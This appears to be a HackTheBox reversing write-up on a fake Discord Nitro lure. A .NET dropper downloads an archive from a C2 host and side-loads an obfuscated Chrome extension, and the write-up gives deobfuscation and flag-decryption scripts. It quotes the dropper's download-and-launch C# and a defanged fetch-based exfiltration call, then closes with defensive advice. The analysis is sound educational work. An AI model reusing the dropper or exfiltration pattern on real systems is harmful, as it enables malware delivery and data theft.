---
title: "ChromeMiner"
date: 2027-09-15 09:00:00 -0500
categories: [HackTheBox, Challenges, Reversing]
tags: [hackthebox, challenge, reversing, javascript-deobfuscation, chrome-extension, dotnet, aes-cbc, webcrypto]
description: "A fake Discord Nitro giveaway ships a .NET dropper that side-loads a malicious Chrome extension; its background.js hides everything behind an array-index obfuscator, and the flag falls out of a nested AES-CBC where the inner decrypt of a hardcoded blob — keyed by a string sitting right next to it — is the secret."
---

A browser extension claiming to run a "Discurd Nitro" VIP giveaway was pulled from the addon store over cryptomining suspicions. The task: figure out what the addon actually does. The path runs through a phishing site, a .NET dropper, an obfuscated MV3 extension, and a deliberately misleading crypto routine.

## Overview

ChromeMiner is a Reversing challenge built around **JavaScript deobfuscation**. The chain is: a Discord-lookalike phishing page → a .NET "dropper" EXE that side-loads a Chrome extension → a `background.js` that hides all of its logic behind an array-index string obfuscator → a nested WebCrypto AES-CBC routine whose *inner* decryption yields the flag. The trick is recognizing that both the obfuscation and the outer encryption are misdirection.

## The technique

Two ideas carry the solve:

1. **Array-index string obfuscation.** The malicious script declares one giant array of `\xNN`-escaped string fragments, then writes every statement as a chain of array lookups — `q[0xf4]+q[0x52]+q[0x147]+...` — that concatenates into a method or property name at runtime. `strings` and `grep` see nothing useful. You recover the code by resolving the array and substituting each chain with its joined string.

2. **Nested `encrypt(decrypt(blob))`.** The deobfuscated code derives an exfil key by decrypting a *hardcoded* ciphertext and then using the result as the key to encrypt outgoing data. The outer encryption is noise — the **inner decryption of the hardcoded blob is the flag**, and its key and IV are a 16-byte ASCII string sitting in the same routine.

## Solution

**1 — Map the delivery chain.** The challenge serves a Flask phishing page that links a download:

```bash
curl -s http://<host>:<port>/ | grep -oiE '(href|src)="[^"]+"'
# ... href="/static/nitro/DiscurdNitru.exe"
curl -s http://<host>:<port>/static/nitro/DiscurdNitru.exe -o DiscurdNitru.exe
file DiscurdNitru.exe        # PE32+ ... Mono/.Net assembly
```

**2 — Decompile the .NET dropper.** It is a small assembly named `dropper`:

```bash
ilspycmd DiscurdNitru.exe -o decompiled
```

`Main` downloads an archive from a hardcoded path and starts Chrome with `--load-extension`:

```csharp
webClient.DownloadFile(new Uri("https://" + host + ".htb/c2VjcmV0/archive.zip?k=ZGlzY3VyZG5pdHJ1"), "archive.zip");
ZipFile.ExtractToDirectory("archive.zip", "DiscurdNitru");
Process.Start(chrome, "--load-extension=\"" + ... + "DiscurdNitru\" ...");
```

The path segments are base64: `c2VjcmV0` = `secret`, `k=ZGlzY3VyZG5pdHJ1` = `discurdnitru`.

**3 — Pull the extension off the same host.** The `.htb` C2 domains aren't reachable, but the challenge container serves the identical path — the `?k=` query is required (the server returns 500 without it):

```bash
curl -s 'http://<host>:<port>/c2VjcmV0/archive.zip?k=ZGlzY3VyZG5pdHJ1' -o archive.zip
unzip archive.zip            # background.js, manifest.json, icons
```

**4 — Deobfuscate `background.js`.** It is `q = ['\x6D\x61','', ...]` (~1500 fragments) followed by pure `q[idx]+q[idx]+...` chains. Resolve the array and substitute every chain. Save this as `deob.py`:

```python
import re, sys
src = open('background.js').read()
m = re.search(r'q = \[(.*?)\];', src, re.S)
elems = [bytes(x, 'utf-8').decode('unicode_escape')
         for x in re.findall(r"'((?:[^'\\]|\\.)*)'", m.group(1))]
body = src[m.end():]

def resolve(match):
    idxs = re.findall(r'0x[0-9a-fA-F]+', match.group(0))
    return repr(''.join(elems[int(i, 16)] if int(i, 16) < len(elems) else ''
                        for i in idxs))

print(re.sub(r'q\[0x[0-9a-fA-F]+\](?:\s*\+\s*q\[0x[0-9a-fA-F]+\])*', resolve, body))
```

```bash
python3 deob.py
```

The recovered logic is a fake "miner": it SHA-256-hashes random bytes and, on a match, exfiltrates via `fetch('hxxps://...evil/'+hex)`. The exfil key is built by a nested AES-CBC:

```js
encrypt(j, key = importKey( decrypt(hardcoded_ct, key=iv='_NOT_THE_SECRET_') ))
```

**5 — Decrypt the inner blob.** The inner `crypto.subtle.decrypt` of the hardcoded ciphertext, keyed by the 16-byte ASCII `_NOT_THE_SECRET_` (used as both key and IV), is the flag. Save `solve.py`:

```python
from Crypto.Cipher import AES
ct = bytes.fromhex('E242E64261D21969F65BEDF954900A995209099FB6C3C682C0D9C4B275B1C212BC188E0882B6BE72C749211241187FA8')
key = iv = b'_NOT_THE_SECRET_'
pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
print(pt[:-pt[-1]].decode())          # strip PKCS7 padding
```

```bash
python3 solve.py
# HTB{...}
```

## Why it worked

The author leaned on two layers of misdirection, neither of which is a real defense. The [array-index obfuscation](https://cwe.mitre.org/data/definitions/506.html) only hides identifiers behind lookups — resolving the array and substituting the chains recovers the source mechanically. And nesting the secret inside `encrypt(decrypt(blob))` steers an analyst toward the outer exfil key, when in fact the inner decryption of the *hardcoded* operand — keyed by a plaintext string sitting in the same function — is the answer. A secret embedded in client-side code is recoverable no matter how it's wrapped.

## Fix / defense

- Secrets belong server-side, derived per session from a server-issued token — never shipped inside client/extension code, obfuscated or not.
- Web Store review and EDR should flag MV3 service workers that call `crypto.subtle` with hardcoded keys/IVs plus `fetch()` exfil, and extensions requesting `<all_urls>` + `scripting` + `tabs` without clear provenance.
- Block unknown EXE droppers via application control, and deny outbound HTTP from workstation processes to unknown hosts to break the side-load-and-fetch chain.
